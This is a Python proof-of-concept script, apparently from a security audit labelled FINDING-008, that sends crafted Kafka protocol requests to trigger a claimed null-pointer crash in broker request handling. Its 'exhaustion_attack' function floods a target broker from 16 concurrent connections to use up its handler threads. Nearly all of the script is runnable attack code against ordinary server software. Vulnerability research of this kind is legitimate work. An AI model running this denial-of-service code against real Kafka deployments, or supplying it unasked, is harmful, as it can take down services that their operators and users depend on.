#!/usr/bin/env python3
"""
FINDING-008 PoC: RequestChannel NULL Dereference After Buffer Release → Broker Crash
======================================================================================
Demonstrates that sending a valid request for an API key where
requiresDelayedAllocation == false, combined with an error condition that
triggers a post-release buffer access (via toString() or logging), causes
a NullPointerException on the broker's request handler thread.

The PoC identifies API keys with requiresDelayedAllocation=false, crafts
minimal valid requests for them, and looks for error log patterns indicating
NPE in the request handling pipeline.

Attack pattern:
  1. Send a structurally valid request for API key K (no delayed allocation)
  2. Ensure the request triggers an error handler path (topic not found, etc.)
  3. The error path calls request.toString() → buffer=null → NPE
  4. Repeat from multiple connections to exhaust request handler threads

Prerequisites:
    pip install kafka-python
"""

import socket
import struct
import time
import threading
import sys
from typing import Optional

# ============================================================
# Kafka API keys and whether they require delayed allocation
# (based on ApiKeys.java in apache/kafka)
# ============================================================
KAFKA_API_KEYS = {
    0:  ("PRODUCE",              True),   # requiresDelayedAllocation=true
    1:  ("FETCH",                True),   # requiresDelayedAllocation=true
    2:  ("LIST_OFFSETS",         False),  # requiresDelayedAllocation=false ← VULNERABLE
    3:  ("METADATA",             False),  # requiresDelayedAllocation=false ← VULNERABLE
    8:  ("OFFSET_COMMIT",        False),  # requiresDelayedAllocation=false ← VULNERABLE
    9:  ("OFFSET_FETCH",         False),  # requiresDelayedAllocation=false ← VULNERABLE
    10: ("FIND_COORDINATOR",     False),  # requiresDelayedAllocation=false ← VULNERABLE
    15: ("DESCRIBE_GROUPS",      False),  # requiresDelayedAllocation=false ← VULNERABLE
    18: ("API_VERSIONS",         False),  # requiresDelayedAllocation=false ← VULNERABLE
    20: ("DELETE_TOPICS",        False),  # requiresDelayedAllocation=false ← VULNERABLE
    37: ("CREATE_PARTITIONS",    False),  # requiresDelayedAllocation=false ← VULNERABLE
}

def encode_i16(v: int) -> bytes:
    return struct.pack(">h", v)

def encode_i32(v: int) -> bytes:
    return struct.pack(">i", v)

def encode_str(s: Optional[str]) -> bytes:
    if s is None:
        return encode_i16(-1)
    b = s.encode("utf-8")
    return encode_i16(len(b)) + b

def build_request(api_key: int, api_version: int, body: bytes,
                  correlation_id: int = 1, client_id: str = "null-deref-probe") -> bytes:
    """Build a Kafka request with standard request header."""
    header = (
        encode_i16(api_key) +
        encode_i16(api_version) +
        encode_i32(correlation_id) +
        encode_str(client_id)
    )
    payload = header + body
    return encode_i32(len(payload)) + payload


def build_metadata_request_nonexistent_topic() -> bytes:
    """
    METADATA request (api_key=3) for a topic that doesn't exist.
    This is structurally valid but causes an error handler path on the broker.
    API version 1, single topic name that doesn't exist.
    """
    # MetadataRequest v1:
    # topics: [string] (array of topic names)
    topic_name = b"nonexistent-topic-null-deref-probe-12345"
    # NULLABLE_ARRAY header: int32 count
    topics_array = encode_i32(1) + encode_i16(len(topic_name)) + topic_name
    return build_request(api_key=3, api_version=1, body=topics_array)


def build_list_offsets_request_nonexistent() -> bytes:
    """
    LIST_OFFSETS request (api_key=2) for a non-existent topic.
    requiresDelayedAllocation=false → buffer released early.
    Error path accesses buffer after release → NPE.
    """
    # ListOffsetsRequest v1:
    # replica_id: int32 (-1 for consumer)
    # topics: [{topic_name, [{partition_index, timestamp}]}]
    replica_id = encode_i32(-1)
    topic_name = b"no-such-topic-null-deref"
    partition_data = encode_i32(0) + struct.pack(">q", -1)  # partition 0, timestamp -1 (latest)
    topic_data = encode_i16(len(topic_name)) + topic_name + encode_i32(1) + partition_data
    topics_array = encode_i32(1) + topic_data
    body = replica_id + topics_array
    return build_request(api_key=2, api_version=1, body=body)


def build_api_versions_request() -> bytes:
    """
    API_VERSIONS request (api_key=18, v0).
    Minimal body. Tests whether even this benign request
    can trigger the null-deref in error logging paths.
    """
    return build_request(api_key=18, api_version=0, body=b"")


def send_and_measure(broker_host: str, broker_port: int,
                     request: bytes, label: str) -> bool:
    """Send a request and check for error response or connection drop."""
    try:
        with socket.create_connection((broker_host, broker_port), timeout=5) as s:
            s.sendall(request)
            # Read response length
            resp_len_bytes = s.recv(4)
            if len(resp_len_bytes) < 4:
                print(f"[{label}] Connection dropped without response — possible NPE crash")
                return True  # potential NPE
            resp_len = struct.unpack(">i", resp_len_bytes)[0]
            if resp_len <= 0 or resp_len > 1_000_000:
                print(f"[{label}] Invalid response length: {resp_len} — likely broker error")
                return True
            resp_body = s.recv(min(resp_len, 4096))
            print(f"[{label}] Response: {resp_len} bytes, header: {resp_body[:8].hex()}")
            return False
    except (ConnectionResetError, ConnectionRefusedError, socket.timeout) as e:
        print(f"[{label}] Connection error: {e} — broker may have crashed request thread")
        return True


def exhaustion_attack(broker_host: str, broker_port: int, thread_count: int = 16):
    """
    Thread exhaustion: send coordinated null-deref-triggering requests
    from multiple connections to exhaust the broker's request handler pool.
    Default Kafka: num.io.threads=8, num.network.threads=3.
    """
    print(f"\n[*] Starting exhaustion attack with {thread_count} concurrent connections...")

    request = build_metadata_request_nonexistent_topic()
    results = []
    lock = threading.Lock()

    def worker():
        crashed = send_and_measure(broker_host, broker_port, request, "exhaustion")
        with lock:
            results.append(crashed)

    threads = [threading.Thread(target=worker) for _ in range(thread_count)]
    for t in threads:
        t.start()
        time.sleep(0.05)  # slight stagger
    for t in threads:
        t.join()

    crashes = sum(results)
    print(f"\n[*] Results: {crashes}/{thread_count} connections triggered potential NPE")
    if crashes > thread_count // 2:
        print("[!] Majority of connections dropped — request handler pool likely exhausted")


def main():
    if len(sys.argv) < 3:
        print(f"Usage: python3 {sys.argv[0]} <broker-host> <broker-port>")
        print(f"  Example: python3 {sys.argv[0]} localhost 9092")
        print()
        print("This PoC sends requests that trigger the null-dereference path")
        print("in RequestChannel.scala after early buffer release.")
        print()
        print("CAUTION: May crash broker request handler threads.")
        print("         Use in isolated lab environments ONLY.")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])

    print("=" * 60)
    print("FINDING-008: RequestChannel NULL Dereference PoC")
    print("=" * 60)
    print(f"Target: {host}:{port}")
    print()
    print("API keys with requiresDelayedAllocation=false (vulnerable):")
    for k, (name, delayed) in KAFKA_API_KEYS.items():
        if not delayed:
            print(f"  API key {k:3d}: {name}")
    print()

    # Test 1: API_VERSIONS (safest, benign)
    print("[Test 1] API_VERSIONS request (minimal, no topic required)...")
    send_and_measure(host, port, build_api_versions_request(), "API_VERSIONS")

    # Test 2: METADATA with nonexistent topic (triggers error path)
    print("\n[Test 2] METADATA request for nonexistent topic (triggers error handler)...")
    send_and_measure(host, port, build_metadata_request_nonexistent_topic(), "METADATA")

    # Test 3: LIST_OFFSETS with nonexistent topic
    print("\n[Test 3] LIST_OFFSETS for nonexistent topic...")
    send_and_measure(host, port, build_list_offsets_request_nonexistent(), "LIST_OFFSETS")

    # Test 4: Exhaustion attack
    print()
    response = input("[?] Run exhaustion attack (16 concurrent connections)? [y/N]: ")
    if response.strip().lower() == "y":
        exhaustion_attack(host, port)

    print("\n[*] Check broker logs for NullPointerException in kafka.network.RequestChannel")
    print("    Pattern to grep: 'NullPointerException' AND 'RequestChannel'")


if __name__ == "__main__":
    main()
